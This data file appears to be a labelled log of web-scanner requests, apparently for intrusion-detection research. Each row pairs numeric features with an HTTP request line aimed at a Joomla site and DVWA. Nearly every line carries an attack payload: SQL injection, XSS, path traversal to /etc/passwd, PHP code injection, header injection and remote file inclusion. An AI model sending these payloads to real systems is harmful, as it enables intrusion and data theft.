105,1,200,3548,13,40,20,6,1,GET /index.php/component/content/category/2--1'%20OR%203*2<(0%2b5%2b209-209)%20or%20'eRaEhFRv'=' HTTP/1.1
100,3,200,3163,7,68,9,5,0,GET /index.php/component/search/?searchword=ul.menu9729984&ordering=newest&searchphrase=all HTTP/1.1
89,3,200,3166,7,62,9,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword='\" HTTP/1.1
88,1,200,237,9,44,16,5,1,POST /index.php/component/users/?task=qTo3ig5t'));select%20pg_sleep(4);%20--%20 HTTP/1.1
46,1,301,632,11,21,4,4,1,GET /DVWA/vulnerabilities/fi?page='\" HTTP/1.1
104,3,200,3168,7,75,11,6,0,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword=/%5cwww.vulnweb.com HTTP/1.1
43,1,404,4077,7,12,6,4,1,GET http://192.168.4.161/index.php HTTP/1.1
84,3,200,3100,7,56,12,5,0,GET /index.php/component/search/?ordering=<!--&searchphrase=any&searchword= HTTP/1.1
62,1,500,2043,9,38,4,6,1,GET /index.php/component/content/JyI=/2-uncategorised HTTP/1.1
49,1,200,510,8,30,2,5,0,GET /media/system/images/printButton.png HTTP/1.1
90,1,404,517,7,26,17,5,1,GET /12345'\"\\'\\\");|]*%00{%0d%0a<%00>%bf%27'\xf0\x9f\x92\xa9/component/search/ HTTP/1.1
129,3,200,1523,7,66,32,15,1,GET /index.php/2-uncategorised/1-testsayfasi?page=../../../../../../../../../../etc/passwd%00.jpg&print=1&tmpl=component HTTP/1.1
18,1,301,518,11,0,1,2,0,GET /DVWA HTTP/1.1
104,1,200,2759,8,37,34,21,1,POST /index.php/component/users/?task=../../../../../../../../../../../../../../../proc/version HTTP/1.1
214,3,200,3338,17,118,49,7,1,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword=if(now()=sysdate()%2csleep(10)%2c0)/*'XOR(if(now()=sysdate()%2csleep(10)%2c0))OR'\"XOR(if(now()=sysdate()%2csleep(10)%2c0))OR\"*/ HTTP/1.1
122,4,200,3174,13,87,12,5,1,GET /index.php/component/search/?searchword=the&ordering=alpha&searchphrase=acxScRiPtkzsyScRiPt&areas[0]=contacts HTTP/1.1
119,3,200,338,15,55,24,5,1,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=1&tmpl='\"()%26%25<acx><ScRiPt%20>hZ4P(9849)</ScRiPt> HTTP/1.1
113,1,404,578,19,47,19,6,1,GET /index.php%25'%20AND%202*3*8=6*8%20AND%20'TIjI'!='TIjI%25/component/content/category/2-uncategorised HTTP/1.1
72,3,500,2051,7,46,9,5,1,GET /index.php/component/content/?format=feed&type=rss&view=%5c HTTP/1.1
92,3,200,3094,7,67,9,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=index.php&searchword= HTTP/1.1
62,1,200,237,8,36,6,5,0,POST /index.php/component/users/?task=set%7cset%26set HTTP/1.1
112,1,404,3988,7,76,13,6,1,GET /index.php/component/content/category/';print(md5(acunetix_wvs_security_test));%24a='-uncategorised HTTP/1.1
26,1,404,503,7,10,1,3,1,GET /phpmyadmin2/ HTTP/1.1
37,1,404,513,8,20,2,3,1,POST /phpmoadmin/moadmin.php HTTP/1.1
99,3,200,3154,7,71,10,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=index.php%00 HTTP/1.1
138,3,200,3079,7,67,24,5,1,GET /index.php/component/search/?ordering=12345'\"\\'\\\");|]*%00{%0d%0a<%00>%bf%27'\xf0\x9f\x92\xa9&searchphrase=all&searchword= HTTP/1.1
52,2,500,2061,7,29,8,2,1,GET /index.php?format=index.php%00&type=rss HTTP/1.1
109,1,200,3252,8,73,10,11,0,GET /index.php/component/content/article/2-http://testasp.vulnweb.com/t/fit.txt%3F.jpg/1-testsayfasi HTTP/1.1
46,1,200,223,19,15,2,6,0,GET /DVWA/dvwa/includes/DBMS/DBMS.php HTTP/1.1
105,1,404,3989,7,75,9,6,1,GET /index.php/component/content/category/;print(md5(acunetix_wvs_security_test));-uncategorised HTTP/1.1
121,3,200,3138,12,70,20,5,1,GET /index.php/component/search/?ordering=HV7e4NNJ'));select%20pg_sleep(6);%20--%20&searchphrase=any&searchword= HTTP/1.1
123,4,200,3202,7,74,13,5,1,GET /index.php/component/search/?searchword={{9999114*10000456}}&ordering=alpha&searchphrase=all&areas[0]=weblinks HTTP/1.1
87,3,200,3098,9,60,9,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=JyI=&searchword= HTTP/1.1
74,1,404,557,8,48,5,6,1,GET /index.php<ge4Oh6</component/content/category/2-uncategorised HTTP/1.1
48,1,404,3995,7,27,4,6,1,GET /index.php//www.vulnweb.com/search/ HTTP/1.1
52,1,404,529,8,30,3,4,1,GET /chIu1oui/2-uncategorised/1-testsayfasi HTTP/1.1
134,3,200,3148,17,73,22,6,1,GET /index.php/component/search/?ordering=category&searchphrase=all'\"()%26%25<acx><ScRiPt%20>RBUT(9800)</ScRiPt>&searchword= HTTP/1.1
116,1,200,3514,7,53,28,11,1,GET /index.php/2-uncategorised/.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd-testsayfasi HTTP/1.1
84,1,404,3990,7,50,9,9,1,GET /index.php/component/http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg/ HTTP/1.1
125,3,200,3266,7,77,16,5,1,GET /index.php/component/search/?ordering=oldest&searchphrase=any&searchword='%2bresponse.write(9696811*9478124)%2b' HTTP/1.1
78,1,404,3991,7,49,5,6,1,GET /index.php/component/%252fetc%252fpasswd/category/2-uncategorised HTTP/1.1
83,1,500,2069,9,30,14,5,1,GET /index.php/component/users/?view=-1%20OR%202%2b582-582-1=0%2b0%2b0%2b1 HTTP/1.1
112,4,200,3174,7,82,13,5,0,GET /index.php/component/search/?searchword=ul.menu&ordering=newest&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
22,1,200,312,7,7,1,3,0,GET /plugins/ HTTP/1.1
92,3,500,2067,7,60,10,5,1,GET /index.php/component/content/?format=%252fetc%252fpasswd&type=rss&view=featured HTTP/1.1
31,1,404,507,7,14,1,5,1,GET //component/users/ HTTP/1.1
131,3,200,3140,10,78,21,5,1,GET /index.php/component/search/?ordering=category&searchphrase=JiGqqOlj';%20waitfor%20delay%20'0:0:5'%20--%20&searchword= HTTP/1.1
82,3,200,1523,7,54,10,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=1&tmpl=component HTTP/1.1
99,3,200,3118,13,66,10,6,0,GET /index.php/component/search/?ordering=popular&searchphrase=WEB-INF/web.xml&searchword= HTTP/1.1
107,4,200,3165,7,78,12,5,0,GET /index.php/component/search/?searchword=the&ordering=oldest&searchphrase=all&areas[0]=weblinks HTTP/1.1
28,1,404,505,7,9,2,2,1,GET /backup_192.sql HTTP/1.1
110,1,200,3306,12,40,21,4,1,GET /index.php/-1'%20OR%203%2b528-528-1=0%2b0%2b0%2b1%20or%20'S912wkFN'='-uncategorised/1-testsayfasi HTTP/1.1
90,3,200,3151,7,62,9,5,1,GET /index.php/component/search/?ordering=oldest&searchphrase=any&searchword=1'\" HTTP/1.1
106,3,200,3177,7,63,9,5,1,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword={{9999410*9999368}} HTTP/1.1
107,3,200,3117,13,77,8,5,1,GET /index.php/component/search/?searchword=&ordering=category&searchphrase=allacxScRiPtkzsyScRiPt HTTP/1.1
108,4,200,3162,7,79,12,5,0,GET /index.php/component/search/?searchword=the&ordering=newest&searchphrase=exact&areas[0]=content HTTP/1.1
96,3,200,3114,7,68,11,5,0,GET /index.php/component/search/?ordering=popular&searchphrase[$acunetix]=1&searchword= HTTP/1.1
97,1,500,2093,7,52,11,6,1,GET /index.php/component/content/'%2bresponse.write(9676140*9552316)%2b'/2-uncategorised HTTP/1.1
4124,1,400,485,7,33,2043,2037,1,GET /index.php/component/invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ HTTP/1.1
212,3,200,3339,17,119,49,7,1,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=if(now()=sysdate()%2csleep(3)%2c0)/*'XOR(if(now()=sysdate()%2csleep(3)%2c0))OR'\"XOR(if(now()=sysdate()%2csleep(3)%2c0))OR\"*/ HTTP/1.1
106,3,200,3155,13,75,9,5,1,GET /index.php/component/search/?searchword=ul.menu&ordering=acxScRiPtkzsyScRiPt&searchphrase=all HTTP/1.1
40,1,404,3995,14,15,2,5,1,GET /index.php/HvWHLLCJ/search/ HTTP/1.1
42,1,302,384,11,17,5,3,1,GET /DVWA/security.php?phpids='\" HTTP/1.1
65,1,404,3993,7,34,7,6,1,GET /index.php/component/content/category/2-%f0''%f0\"\" HTTP/1.1
50,1,200,2325,7,29,2,5,1,GET /templates/beez_20/javascript/hide.js HTTP/1.1
110,1,404,3986,7,56,24,7,1,GET /index.php/component/content/article/2-uncategorised/%5e(%23%24!%40%23%24)(()))******-testsayfasi HTTP/1.1
132,3,200,3243,9,67,22,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=-1%20OR%202%2b124-124-1=0%2b0%2b0%2b1%20--%20 HTTP/1.1
136,3,200,3267,23,71,18,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=acu4836%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca4836 HTTP/1.1
54,1,302,387,11,31,2,4,0,GET /DVWA/vulnerabilities/view_source_all.php HTTP/1.1
89,3,200,3163,7,63,9,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=%5c HTTP/1.1
84,1,400,485,7,33,23,15,1,GET /../../../../../../../../../../etc/passwd/2-uncategorised/1-testsayfasi HTTP/1.1
165,3,200,1854,15,83,22,6,1,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20'\"()%26%25<acx><ScRiPt%20>pnMW(9281)</ScRiPt>&tmpl=component HTTP/1.1
87,3,200,3093,7,60,9,5,1,GET /index.php/component/search/?ordering=popular&searchphrase='\"&searchword= HTTP/1.1
106,1,404,3993,7,69,10,10,1,GET /index.php/http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg/content/category/2-uncategorised HTTP/1.1
119,1,500,2075,9,52,18,7,1,GET /index.php/component/content/-1\"%20OR%202%2b862-862-1=0%2b0%2b0%2b1%20--%20/2-uncategorised/1-testsayfasi HTTP/1.1
122,3,200,1741,8,83,14,9,0,GET /index.php/component/mailto/?link=http://testasp.vulnweb.com/t/fit.txt%3F.jpg&template=beez_20&tmpl=component HTTP/1.1
44,1,302,384,13,19,5,3,0,GET /DVWA/instructions.php?doc=JyI= HTTP/1.1
125,4,200,3144,13,90,12,5,1,GET /index.php/component/search/?searchword=&ordering=popular&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=newsfeeds HTTP/1.1
119,1,500,2107,7,79,14,7,1,GET /index.php/component/content/';print(md5(acunetix_wvs_security_test));%24a='/2-uncategorised/1-testsayfasi HTTP/1.1
23,1,301,583,11,4,1,3,0,GET /DVWA/dvwa HTTP/1.1
92,1,301,727,11,52,11,4,1,GET /DVWA/vulnerabilities/fi?page=\";print(md5(acunetix_wvs_security_test));%24a=\" HTTP/1.1
120,3,200,3251,7,84,12,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9868)\"&ordering=popular&searchphrase=all HTTP/1.1
127,3,200,3080,7,68,30,16,1,GET /index.php/component/search/?ordering=../../../../../../../../../../etc/passwd%00.jpg&searchphrase=any&searchword= HTTP/1.1
95,1,500,2075,22,46,12,7,1,GET /index.php/component/content/category<WL9EET>KMQUC[!%2b!]</WL9EET>/2-uncategorised HTTP/1.1
117,3,500,2111,8,76,15,5,1,GET /index.php/component/content/?format=feed&type=rss&view=featured<input%20autofocus%20onfocus=p3oZ(9518)> HTTP/1.1
107,1,500,2111,15,59,12,5,1,GET /index.php/component/users/?view=%E5%98%8A%E5%98%8DSomeCustomInjectedHeader:%20injected_by_wvs HTTP/1.1
41,1,404,3995,7,18,5,5,1,GET /index.php/%bf'%bf\"/search/ HTTP/1.1
132,3,200,3153,7,90,16,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=\";print(md5(acunetix_wvs_security_test));%24a=\"&searchword= HTTP/1.1
104,3,500,2071,7,62,12,5,1,GET /index.php/component/content/?format=response.write(9054738*9818636)&type=rss&view=featured HTTP/1.1
4172,3,200,3197,7,75,2049,2037,1,GET /index.php/component/search/?ordering=newest&searchphrase=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.&searchword= HTTP/1.1
